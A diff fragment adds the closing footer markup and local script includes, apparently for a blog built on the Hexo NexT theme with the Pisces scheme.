+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
